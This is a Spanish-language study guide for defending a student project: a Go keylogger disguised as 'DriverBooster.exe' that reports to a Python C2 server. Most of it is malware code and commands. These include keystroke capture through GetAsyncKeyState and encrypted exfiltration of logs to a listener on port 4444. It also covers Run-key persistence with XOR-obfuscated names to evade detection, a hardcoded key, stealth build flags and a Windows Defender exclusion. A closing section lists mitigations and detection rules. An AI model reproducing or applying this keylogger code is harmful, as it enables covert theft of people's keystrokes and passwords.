# Preparación para la Defensa — Proyecto Keylogger / DriverBooster

---

## 0. Compilar el proyecto rápido

```bash
# En Windows (host):
build.bat
# Genera: dist\DriverBooster.exe

# Si build.bat falla:
go build -ldflags="-s -w -H windowsgui -buildid=" -trimpath -o dist\DriverBooster.exe agent.go

# Después de compilar, copiar a Parrot y a la VM Windows.
# En Parrot, hacer git pull para traer server.py actualizado.
```

---

## 1. Modificar el algoritmo de cifrado o el modo de operación

### Cifrado actual: AES-256-GCM

```
agent.go  →  AES-256-GCM (nonce 12 bytes + ciphertext + tag 16 bytes)
server.py →  AESGCM.decrypt(nonce, ciphertext_tag, None)
Clave:     "30eeef8f3188373740553ac599917720c1051874af056836dee8318039077a2b"
```

### Posibles cambios que pidan:

#### a) "Cambiá de AES-256-GCM a AES-128-GCM"

```go
// agent.go - cambiar la clave hex de 64 a 32 caracteres
// hexKey = "30eeef8f3188373740553ac599917720c1051874af056836dee8318039077a2b"  →  32 bytes
hexKey = "30eeef8f3188373740553ac599917720"  // 16 bytes = 128 bits

// server.py / config.py
ENCRYPTION_KEY = "30eeef8f3188373740553ac599917720"  // 32 hex chars
```

`AESGCM` detecta el tamaño de clave automáticamente. No se toca nada más.

#### b) "Cambiá GCM por CBC / CTR / CCM"

Ejemplo AES-256-CBC:

```go
// agent.go
import "crypto/cipher"

func enc(pl, ky []byte) ([]byte, error) {
    b, _ := aes.NewCipher(ky)
    iv := make([]byte, aes.BlockSize)
    rand.Read(iv)
    enc := cipher.NewCBCEncrypter(b, iv)
    // PKCS7 padding
    pad := aes.BlockSize - len(pl)%aes.BlockSize
    pl = append(pl, bytes.Repeat([]byte{byte(pad)}, pad)...)
    dst := make([]byte, len(pl))
    enc.CryptBlocks(dst, pl)
    return append(iv, dst...), nil
}
```

```python
# server.py
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def _decrypt(data, key):
    iv, ct = data[:16], data[16:]
    c = Cipher(algorithms.AES(key), modes.CBC(iv))
    d = c.decryptor()
    pt = d.update(ct) + d.finalize()
    # Remove PKCS7 padding
    pad = pt[-1]
    return pt[:-pad].decode("utf-8")
```

> **Para la defensa**: "GCM incluye autenticación (tag de 16 bytes) que detecta manipulación. CBC no tiene eso — cualquier alteración pasa desapercibida. Si me pidieran CBC, perderíamos integridad."

#### c) "¿Por qué AES y no RSA / ChaCha20 / XOR?"

| Algoritmo | Serviría? | Por qué sí/no |
|---|---|---|
| **RSA** | No para el payload completo | RSA cifra máx. 256 bytes con clave de 2048 bits. Para logs largos hay que usar híbrido: RSA cifra una clave AES, AES cifra los datos |
| **ChaCha20** | Sí | Misma seguridad que AES, más rápido en CPUs sin AES-NI. En Go: `golang.org/x/crypto/chacha20poly1305` |
| **XOR** | **NO** | XOR con clave fija no es cifrado. Un atacante con un par texto plano + cifrado recupera la clave. `loader.go` lo usa y es su mayor debilidad |

#### d) "Agregá un mensaje de autenticación (AAD)"

```go
// agent.go - pasar contexto adicional
gcm.Seal(nil, n, pl, []byte("DriverBooster-v1"))

// server.py
AESGCM(key).decrypt(nonce, ct, b"DriverBooster-v1")
```

> Si el AAD no coincide al descifrar, `decrypt` lanza `InvalidTag`. Sirve para demostrar que el mensaje no fue alterado.

#### e) "Cambiá AES-256-GCM por ChaCha20-Poly1305"

```go
// agent.go — reemplazar crypto/aes por golang.org/x/crypto/chacha20poly1305
import "golang.org/x/crypto/chacha20poly1305"

func enc(pl, ky []byte) ([]byte, error) {
    aead, err := chacha20poly1305.New(ky)
    if err != nil { return nil, err }
    n := make([]byte, aead.NonceSize())
    rand.Read(n)
    return append(n, aead.Seal(nil, n, pl, nil)...), nil
}
```

```python
# server.py
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

def _decrypt(data, key):
    nonce, ct = data[:12], data[12:]
    return ChaCha20Poly1305(key).decrypt(nonce, ct, None).decode("utf-8")
```

> **Para la defensa**: "ChaCha20 es más rápido que AES en CPUs sin aceleración AES-NI y no tiene vulnerabilidades de canal lateral por software. Google lo usa en TLS y es el método más común en dispositivos móviles."

#### f) "Cambiá GCM por CTR + HMAC (sin tag automático)"

```go
// agent.go — CTR no autentica, hay que agregar HMAC manualmente
import "crypto/hmac"
import "crypto/sha256"

func enc(pl, ky []byte) ([]byte, error) {
    b, _ := aes.NewCipher(ky)
    iv := make([]byte, aes.BlockSize)
    rand.Read(iv)
    ctr := cipher.NewCTR(b, iv)
    dst := make([]byte, len(pl))
    ctr.XORKeyStream(dst, pl)
    // HMAC-SHA256 sobre iv + ciphertext para autenticar
    mac := hmac.New(sha256.New, ky)
    mac.Write(iv)
    mac.Write(dst)
    tag := mac.Sum(nil)
    return append(append(iv, dst...), tag...), nil
}
```

```python
# server.py
import hmac, hashlib

def _decrypt(data, key):
    iv, ct, tag = data[:16], data[16:-32], data[-32:]
    expected = hmac.new(key, iv + ct, hashlib.sha256).digest()
    if not hmac.compare_digest(tag, expected):
        raise ValueError("MAC mismatch")
    c = Cipher(algorithms.AES(key), modes.CTR(iv))
    return c.decryptor().update(ct).decode("utf-8")
```

> **Para la defensa**: "CTR es un modo de flujo (no necesita padding) pero NO autentica. Hay que agregar HMAC manualmente. GCM ya incluye autenticación integrada, por eso lo elegimos."

#### g) "Usá RSA para intercambiar la clave AES (cifrado híbrido)"

```python
# server.py — generar par RSA y enviar clave pública
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization

# En el servidor:
private_key = rsa.generate_private_key(65537, 2048)
public_pem = private_key.public_key().public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)
# Servir public_pem por HTTP al agente al conectarse
```

```go
// agent.go — al iniciar, pedir clave pública RSA y cifrar clave AES con ella
import "crypto/rsa"
import "crypto/x509"

// 1. HTTP GET a server/clave → obtiene PEM con clave pública RSA
// 2. Genera clave AES-256 aleatoria
// 3. La cifra con RSA:
//    encAES, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, aesKey, nil)
// 4. Envía encAES al servidor
// 5. Servidor descifra con RSA privada → obtiene AES key
// 6. Toda la comunicación subsecuente usa esa AES key efímera
```

> **Para la defensa**: "Este es el método PROFESIONAL. La clave AES viaja cifrada con RSA en cada ejecución. Ninguna clave está hardcodeada en el binario. Si analizan el .exe, no encuentran ninguna clave — solo la clave pública RSA, que solo sirve para cifrar."

#### h) "Derivá la clave desde una passphrase con KDF"

```go
// agent.go — en vez de clave hardcodeada, derivar desde passphrase
import "golang.org/x/crypto/pbkdf2"
import "crypto/sha256"

func main() {
    pass := []byte("DriverBooster-Secret-2026")
    salt := []byte("DbSalt2026!")
    // PBKDF2 con 600000 iteraciones
    jk := pbkdf2.Key(pass, salt, 600000, 32, sha256.New)
    // jk es la clave AES-256 derivada
}
```

```python
# server.py
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

passwd = b"DriverBooster-Secret-2026"
salt = b"DbSalt2026!"
kdf = PBKDF2HMAC(hashlib.sha256(), 32, salt, 600000)
key = kdf.derive(passwd)
```

> **Para la defensa**: "PBKDF2 hace que derivar la clave desde la passphrase sea computacionalmente costoso (600k iteraciones). Si un atacante obtiene el binario, extraer la passphrase no es suficiente — necesita las iteraciones. Argon2id es aún mejor pero requiere librería externa."

#### i) "Usá ECDH (X25519) para Perfect Forward Secrecy"

```go
// agent.go — intercambio de claves efímeras por curva elíptica
import "golang.org/x/crypto/curve25519"

func handshake(conn net.Conn) []byte {
    // 1. Generar par efímero
    ephemeral := make([]byte, 32)
    rand.Read(ephemeral)
    public, _ := curve25519.X25519(ephemeral, curve25519.Basepoint)
    // 2. Enviar clave pública efímera al servidor
    conn.Write(public)
    // 3. Recibir clave pública del servidor
    serverPub := make([]byte, 32)
    conn.Read(serverPub)
    // 4. Calcular secreto compartido
    shared, _ := curve25519.X25519(ephemeral, serverPub)
    // 5. Derivar clave AES con HKDF
    return hkdfSHA256(shared)
}
```

> **Para la defensa**: "ECDH con X25519 da Perfect Forward Secrecy: aunque un atacante capture la clave privada del servidor mañana, no puede descifrar el tráfico de hoy. Es el estándar en TLS 1.3."

### Qué decir en la defensa

> "Usamos AES-256-GCM porque es cifrado simétrico AUTENTICADO: garantiza confidencialidad (nadie sin la clave lee el mensaje) e integridad (el tag detecta alteraciones). La clave está embebida por simplicidad académica; en producción usaríamos ECDH (X25519) para intercambio de claves con Perfect Forward Secrecy."

---

## 2. Ajustar intervalo de envío o almacenamiento

### Intervalo actual: 30 segundos

```go
// agent.go - línea ~191
time.Sleep(30 * time.Second)
```

```python
# config.py
SEND_INTERVAL = 30
```

### "Cambiá el intervalo a X segundos"

- **En Go**: cambiar `30 * time.Second` → valor deseado y recompilar
- **En Python**: cambiar `config.py` — también afecta a `keylogger.py`

### "Agregá almacenamiento local con reintentos"

Hoy si el servidor no responde, los datos se pierden. Este cambio agrega respaldo en disco:

```go
// agent.go - en sL(), antes de enviar
func sL(ky []byte) {
    for {
        time.Sleep(30 * time.Second)
        d := pp()
        if d == nil { continue }
        // Guardar en disco primero
        os.WriteFile("C:\\ProgramData\\db.cache", d, 0644)
        ec, err := enc(d, ky)
        if err != nil { continue }
        sd(ec)
    }
}
```

> Se escribe el log local ANTES de enviar. Si el server no responde, los datos sobreviven al reinicio.

### Qué decir en la defensa

> "Cada 30 segundos el buffer se cifra y se envía. Elegimos 30s como balance entre tiempo real y eficiencia de red. Si el servidor no responde, actualmente los datos se pierden — una mejora sería almacenarlos localmente y reintentar."

---

## 3. Explicar y modificar el mecanismo de persistencia

### Persistencia actual: `HKCU\...\Run\DriverBooster Scheduler 10.4`

```go
func st() {
    e, _ := os.Executable()
    rp, _ := syscall.UTF16PtrFromString(rd(zk, 0x2A))  // Software\Microsoft\Windows\CurrentVersion\Run
    ap, _ := syscall.UTF16PtrFromString(rd(zn, 0x2A))  // DriverBooster Scheduler 10.4
    // ... RegOpenKeyExW + RegSetValueExW ...
}
```

Las rutas viajan ofuscadas con XOR (clave 0x2A) para no aparecer en texto plano en el binario.

### "¿Por qué HKCU y no HKLM?"

> HKCU no requiere administrador. HKLM necesita admin. Para un malware que se ejecuta sin privilegios, HKCU es la única opción viable.

### "Cambiá el nombre de la entrada en Run"

Cambiar `zn` en `agent.go`:

```go
var zn = []byte{
    pk('N', 0x2A), pk('v', 0x2A), pk('D', 0x2A), pk('r', 0x2A),
    pk('i', 0x2A), pk('v', 0x2A), pk('e', 0x2A), pk('r', 0x2A),
    pk('U', 0x2A), pk('p', 0x2A), pk('d', 0x2A), pk('a', 0x2A),
    pk('t', 0x2A), pk('e', 0x2A), pk('r', 0x2A),
} // "NvDriverUpdater"
```

y recompilar.

### "Agregá una segunda ruta de persistencia"

```go
// Además de Run, agregar tarea programada
// Usar schtasks.exe via os/exec o直接 COM via syscall
```

### "¿Cómo se elimina la persistencia?"

```cmd
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DriverBooster Scheduler 10.4" /f
taskkill /f /im DriverBooster.exe
```

### Qué decir en la defensa

> "Usamos la clave Run de HKCU porque no requiere permisos de administrador. Windows ejecuta todo lo que está ahí al iniciar sesión. El nombre está ofuscado con XOR para evitar detección por strings."

---

## 4. Agregar o modificar el filtrado de teclas capturadas

### Captura actual: todas las teclas (VK 8 a 255)

```go
for k := 8; k < 256; k++ {
    r, _, _ := pGetAsync.Call(uintptr(k))
    d := r&0x8000 != 0
    if d && !pr[k] {
        // captura
    }
}
```

### "Agregá filtro para no capturar F1-F12"

```go
func vk(v uint32) string {
    if v >= 0x70 && v <= 0x7B { return "" }  // VK_F1 a VK_F12
    // ... resto igual ...
}
```

### "Capturá solo mayúsculas"

```go
func vk(v uint32) string {
    // ... despues de obtener el caracter ...
    s := string(utf16.Decode(o[:n]))
    return strings.ToUpper(s)
}
```

### "No capturar números"

```go
func vk(v uint32) string {
    if v >= 0x30 && v <= 0x39 { return "" }  // VK_0 a VK_9
    // ... resto igual ...
}
```

### "Capturá coordenadas de clics del ratón"

```go
dllUser.NewProc("GetCursorPos")
// En el loop: llama a GetCursorPos y pushea las coordenadas
```

> Esto requiere agregar proc para `GetCursorPos` y llamarlo periódicamente — no es captura de clics real, es polling de posición.

### Qué decir en la defensa

> "Actualmente capturamos todas las teclas VK de 8 a 255. Podemos filtrar por rango de códigos o por tipo de caracter después de la conversión ToUnicode. El filtrado se hace en la función `vk()` antes de agregar al buffer."

---

## 5. Demostrar en vivo el flujo completo

### Script paso a paso para la defensa

```
┌─────────────────────────────────────────────────────────┐
│ DEMO EN VIVO — Captura → Cifrado → Transmisión → Descif. │
└─────────────────────────────────────────────────────────┘
```

**Setup previo (hacer antes de que llegue el profe):**

```bash
# En Parrot:
python3 server.py
# Debe mostrar: [*] Escuchando en 0.0.0.0:4444
```

**Durante la demo:**

```
1. Mostrar server.py corriendo en Parrot (terminal 1)
2. Mostrar Wireshark listo (terminal 2)
   → sudo wireshark → filtro: tcp.port == 4444
3. Ejecutar DriverBooster.exe en Windows (doble clic)
   → No abre ventana (es correcto)
4. Escribir en el Bloc de notas:
   "Hola profe, esto es una prueba 123"
5. Esperar 35 segundos
6. En Parrot:
   - Terminal 1: aparece el texto descifrado
   - Terminal 2: seleccionar paquete TCP → Follow → TCP Stream
     → "Miren, solo bytes cifrados"
7. Mostrar driver_updates.log:
   cat driver_updates.log
```

### Ataque MITM — Demostrar que un tercero NO puede descifrar

Hay **3 formas** de mostrarlo, de más simple a más avanzada:

#### Forma 1 — Wireshark (la estándar)

```
1. Wireshark capturando en Parrot con filtro tcp.port == 4444
2. Llega un paquete del keylogger
3. Clic derecho → Follow → TCP Stream
4. Se ven bytes sin sentido:  8f 3a b1 7e 2c 9d ...
5. "Esto es nonce + ciphertext + tag de AES-256-GCM.
   Sin la clave de 32 bytes, es matemáticamente imposible
   recuperar el texto original."
```

#### Forma 2 — Intentar descifrar con clave incorrecta (en vivo)

```python
# En Parrot, interceptar un paquete con tcpdump y tratar de descifrarlo
# con una clave distinta a la real:

import pyshark
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Clave INCORRECTA (la que no es)
WRONG_KEY = bytes.fromhex("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")

cap = pyshark.LiveCapture(interface="eth0", bpf_filter="tcp port 4444")
for pkt in cap.sniff_continuously(packet_count=1):
    data = bytes.fromhex(pkt.data.data.replace(":", ""))
    length = int.from_bytes(data[:4], "big")
    payload = data[4:4+length]
    nonce, ct = payload[:12], payload[12:]
    try:
        AESGCM(WRONG_KEY).decrypt(nonce, ct, None)
        print("[?] Descifrado con clave incorrecta?")
    except Exception as e:
        print(f"[BLOQUEADO] {e}")  # → InvalidTag
        print("El atacante SIN la clave real NO puede descifrar.")
    break
```

> Ejecutar esto durante la defensa muestra que AES-GCM **rechaza** cualquier clave que no sea la correcta.

#### Forma 3 — Explicación matemática (si preguntan teoría)

```
AES-256-GCM:
  - Clave: 2^256 combinaciones posibles
  - Sin la clave exacta, el tag GCM (16 bytes) falla
  - AES no tiene vulnerabilidades conocidas de criptoanálisis práctico
  - Fuerza bruta: imposible (más átomos que estrellas en el universo)

En la red NAT de VirtualBox:
  - El tráfico entre VMs es visible para el host
  - Pero aunque captures todos los paquetes, solo ves nonce + ciphertext
  - El tag GCM detecta cualquier manipulación activa (MITM activo)
```

**Lo que se evalúa:**

| Momento | Qué demostrar |
|---|---|
| Captura | Las teclas se registran (se ve en el log descifrado) |
| Cifrado | Wireshark muestra el payload como bytes aleatorios |
| Transmisión | El paquete viaja por TCP al puerto 4444 |
| MITM | Intentar descifrar sin la clave → InvalidTag |
| Descifrado | server.py muestra el texto original correctamente |

**Errores comunes:**

| Síntoma | Causa | Solución |
|---|---|---|
| server.py no arranca | Falta `cryptography` | `sudo apt install python3-cryptography -y` |
| server.py error APPDATA | No es Windows | Ya está fixeado con try/except |
| No llegan datos | IP incorrecta en agent.go | Verificar con `ip addr show` en Parrot |
| No llegan datos | Firewall | `sudo ufw status` → debe estar inactivo |
| No llegan datos | .exe viejo | Recompilar con `build.bat` y copiar a Windows |
| No llegan datos | Puerto ocupado | `ss -tlnp \| grep 4444` — matar proceso anterior |
| Windows Defender borra .exe | Sin exclusión | `Add-MpPreference -ExclusionPath "dist"` |

### Guía rápida de comandos

```bash
# ===== PARRAT (atacante) =====
python3 server.py                          # Iniciar servidor C2
sudo wireshark                             # Capturar tráfico
ss -tlnp | grep 4444                       # Verificar que escucha
sudo apt install python3-cryptography -y   # Si falta librería

# ===== WINDOWS (víctima) =====
build.bat                                  # Recompilar
.\dist\DriverBooster.exe                   # Ejecutar
taskkill /f /im DriverBooster.exe          # Matar proceso
reg delete "HKCU\...\Run" /v "DriverBooster Scheduler 10.4" /f  # Limpiar persistencia

# ===== SI EL TRÁFICO NO LLEGA =====
# En Parrot, verificar IP:
ip addr show
# Si no aparece 195.0.1.5:
sudo ip addr add 195.0.1.5/24 dev eth0
```

---

## 6. Mitigación — Contramedidas para usuarios y especialistas TI

### Para usuarios finales

| Medida | Cómo ayuda |
|---|---|
| **Antivirus actualizado** | Detecta keyloggers conocidos por firma. El nuestro tiene 4/60 detecciones en VT — no es invulnerable. |
| **Autenticación de dos factores (2FA)** | Invalida credenciales robadas. Aunque el keylogger capture la contraseña, el atacante necesita el segundo factor. |
| **Gestor de contraseñas con autocompletado** | Las contraseñas no se tipean → no se capturan. Los gestores modernos (Bitwarden, Keepass) pegan directamente en el campo. |
| **No ejecutar archivos de fuentes desconocidas** | El vector de infección principal es el usuario ejecutando el binario manualmente (T1204.002). |
| **Revisar procesos en segundo plano** | `Ctrl+Shift+Esc` → verificar procesos sospechosos como `DriverBooster.exe` sin firma digital válida. |

### Para especialistas TI

| Herramienta | Detección |
|---|---|
| **Sysmon EventID 13** | Alerta sobre escrituras en clave `Run` del registro por procesos no firmados. Comando: `reg.exe add HKLM\...\Run` |
| **Sysmon EventID 1** | Detección de creación de proceso: `DriverBooster.exe` originado desde descarga web o carpeta temporal. |
| **EDR (CrowdStrike, SentinelOne)** | Detecta `GetAsyncKeyState` como API de captura de input. Regla heurística: polling de teclas + conexión TCP saliente a puerto no estándar. |
| **Firewall de salida con allowlist** | Solo ejecutables autorizados pueden hacer conexiones salientes. Bloquear `DriverBooster.exe` en puerto 4444. |
| **Wireshark / IDS (Snort, Suricata)** | Regla: tráfico TCP periódico a IP externa en puerto alto (4444) con payload de entropía alta (cifrado). Esto es beaconing. |
| **Autoruns (Sysinternals)** | Auditoría periódica de entradas en `HKCU\...\Run`. Detectar `DriverBooster Scheduler 10.4` como entrada sospechosa. |
| **Process Monitor** | Monitorear acceso a `user32.dll` + `advapi32.dll` por procesos no firmados. |

### Comandos de detección y respuesta

```powershell
# Detectar proceso
Get-Process -Name DriverBooster -ErrorAction SilentlyContinue

# Detectar persistencia
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Matar proceso
Stop-Process -Name DriverBooster -Force

# Eliminar persistencia
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "DriverBooster Scheduler 10.4"

# Regla SNORT para detectar el tráfico
alert tcp any 4444 -> any any (msg:"DriverBooster C2 beacon"; flow:from-client; content:"|00 00 00|"; threshold:type both, track by_src, count 3, seconds 90; sid:1000001;)
```
